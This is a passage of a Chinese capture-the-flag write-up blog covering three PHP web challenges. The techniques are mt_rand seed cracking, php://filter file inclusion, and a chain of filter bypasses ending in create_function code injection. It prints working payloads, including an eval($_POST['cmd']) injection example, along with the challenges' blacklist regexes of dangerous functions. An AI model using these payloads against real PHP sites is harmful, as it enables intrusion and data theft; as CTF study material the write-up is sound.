<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x
        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>看到mt_rand，伪随机数漏洞。</p>
<p>先把字母还原</p>
<pre class=" language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
b<span class="token operator">=</span><span class="token string">'lb1MlXS13a'</span>
c <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
length <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
res<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
<span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">27</span> <span class="token number">27</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">48</span> <span class="token number">48</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">59</span> <span class="token number">59</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">54</span> <span class="token number">54</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">27</span> <span class="token number">27</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">29</span> <span class="token number">29</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">61</span></code></pre>
<p>工具爆破一下得到seed：949630651</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201556491.png" srcset="/img/loading.gif" alt="image-20201208201556491"></p>
<p>再通过seed还原完整字符串</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token string">"949630651"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token operator">--</span><span class="token operator">--</span>
lb1MlXS13aqjyh1bbe1R</code></pre>
<p>输入得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201733801.png" srcset="/img/loading.gif" alt="image-20201208201733801"></p>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p><strong>考点：伪协议</strong></p>
<p>进来是这样一个页面，点击按钮可以看猫猫或狗狗的照片。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208202834377.png" srcset="/img/loading.gif" alt="image-20201208202834377"></p>
<p>当url输入引号时，会回显报错。发现include函数。而且句末拼接了.php。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208202937391.png" srcset="/img/loading.gif" alt="image-20201208202937391"></p>
<p>扫后台得到</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208203201724.png" srcset="/img/loading.gif" alt="image-20201208203201724"></p>
<p>尝试伪协议读取</p>
<pre><code>php://filter/read=convert.base64-encode/resource=flag</code></pre><p>没读到flag,那就先读index试试</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
                <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> <span class="token string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>新学了个技巧，原来php://filter伪协议还能套一层</p>
<p>payload</p>
<pre><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208204805399.png" srcset="/img/loading.gif" alt="image-20201208204805399"></p>
<h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p><strong>考点：各种PHP特性，create_function()代码注入</strong></p>
<p>点进来是个威胁实时地图。</p>
<p>源代码发现hint,解base32:1nD3x.php</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209102006443.png" srcset="/img/loading.gif" alt="image-20201209102006443"></p>
<p>访问它给了源码。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//url编码</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//换行符绕过</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//同时GET+POST传同一个参(preg_match只匹配字符，数组可以逃过检测)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token comment" spellcheck="true">//data://</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//数组</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>好嘛，这一题里有一万个绕过。整理一下：</p>
<p>①整体上有对$_ SERVER和$_REQUEST的限制，</p>
<p>虽然做了很多过滤，但是$_SERVER[‘QUERY_STRING’]不解码url，可以用url编码绕过；</p>
<p>$_REQUEST直接不能匹配英文字符，可是我们有许多get传参中需要。</p>
<p>但$_REQUEST存在解析顺序，按默认来说先GET,后POST;两个同时传，就可以用POST把GET覆盖掉。</p>
<p>如php.ini中所示：</p>
<pre class=" language-ini"><code class="language-ini">//php.ini
<span class="token comment" spellcheck="true">; This directive determines which super global arrays are registered when PHP</span>
<span class="token comment" spellcheck="true">; starts up. G,P,C,E &amp;amp; S are abbreviations for the following respective super</span>
<span class="token comment" spellcheck="true">; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty</span>
<span class="token comment" spellcheck="true">; paid for the registration of these arrays and because ENV is not as commonly</span>
<span class="token comment" spellcheck="true">; used as the others, ENV is not recommended on productions servers. You</span>
<span class="token comment" spellcheck="true">; can still get access to the environment variables through getenv() should you</span>
<span class="token comment" spellcheck="true">; need to.</span>
<span class="token comment" spellcheck="true">; Default Value: "EGPCS"</span>
<span class="token comment" spellcheck="true">; Development Value: "GPCS"</span>
<span class="token comment" spellcheck="true">; Production Value: "GPCS";</span>
<span class="token comment" spellcheck="true">; http://php.net/variables-order</span>
<span class="token constant">variables_order</span> <span class="token attr-value"><span class="token punctuation">=</span> "GPCS"</span>

<span class="token comment" spellcheck="true">; This directive determines which super global data (G,P &amp;amp; C) should be</span>
<span class="token comment" spellcheck="true">; registered into the super global array REQUEST. If so, it also determines</span>
<span class="token comment" spellcheck="true">; the order in which that data is registered. The values for this directive</span>
<span class="token comment" spellcheck="true">; are specified in the same manner as the variables_order directive,</span>
<span class="token comment" spellcheck="true">; EXCEPT one. Leaving this value empty will cause PHP to use the value set</span>
<span class="token comment" spellcheck="true">; in the variables_order directive. It does not mean it will leave the super</span>
<span class="token comment" spellcheck="true">; globals array REQUEST empty.</span>
<span class="token comment" spellcheck="true">; Default Value: None</span>
<span class="token comment" spellcheck="true">; Development Value: "GP"</span>
<span class="token comment" spellcheck="true">; Production Value: "GP"</span>
<span class="token comment" spellcheck="true">; http://php.net/request-order</span>
<span class="token constant">request_order</span> <span class="token attr-value"><span class="token punctuation">=</span> "GP"</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209131039995.png" srcset="/img/loading.gif" alt="image-20201209131039995"></p>
<p>②换行符%0A绕过’/^$/’</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>aqua_is_cute<span class="token operator">%</span><span class="token constant">0A</span>
post<span class="token punctuation">:</span>debu<span class="token operator">=</span><span class="token number">1</span></code></pre>
<p>③伪协议绕file_get_contents</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua</span>

post<span class="token punctuation">:</span>file<span class="token operator">=</span><span class="token number">1</span></code></pre>
<p>④数组绕sha1</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span></code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>shana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>passwd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre>
<p>⑤create_function代码注入</p>
<p>本来以为是无参数RCE，但这过滤的也太多了。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>create_function这个确实没见过，学学。</p>
<p>create_function：创建一个匿名函数。create_function内部会执行eval函数。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209180141835.png" srcset="/img/loading.gif" alt="image-20201209180141835"></p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$lambda1</span><span class="token operator">=</span><span class="token string">"return ln($a)+ln($b)"</span>"<span class="token punctuation">;</span>
<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a,$b'</span><span class="token punctuation">,</span><span class="token variable">$lambda_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

等价于

<span class="token keyword">function</span> <span class="token function">lambda1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">"ln($a)+ln($b)"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>那么如果$lamdba_1=return $a+$b;}eval($_POST[‘cmd’];\\</p>
<p>执行时就会变成，可以RCE了。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">lambda1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//}</span></code></pre>
<p>正好里有个extract()</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209203444303.png" srcset="/img/loading.gif" alt="image-20201209203444303"></p>
<p>那就像这样构造：</p>
<pre><code>flag[code]=create_function&amp;flag[arg]=;}function();//</code></pre><p>然后开始看大师傅的wp，哎</p>
<p>我忽略了这个地方，代码里写了包含flag.php。</p>
<p>既然包含了，那不用去直接读flag.php也可以得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209205501327.png" srcset="/img/loading.gif" alt="image-20201209205501327"></p>
<p>这时候就需要一个函数，可以输出所有变量的值：get_defined_vars()</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209205832375.png" srcset="/img/loading.gif" alt="image-20201209205832375"></p>
<p>那么结合上面所有的可以这样构造payload:</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>debu_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}var_dump(get_defined_vars());//</span>
post<span class="token punctuation">:</span>
debu<span class="token operator">=</span><span class="token number">1</span>
file<span class="token operator">=</span><span class="token number">1</span>
<span class="token operator">--</span><span class="token operator">></span><span class="token property">url</span>编码后得到
<span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}var_dump(get_defined_vars());//</span></code></pre>
<p>传入得到，…哦这flag还在另一个文件里</p>
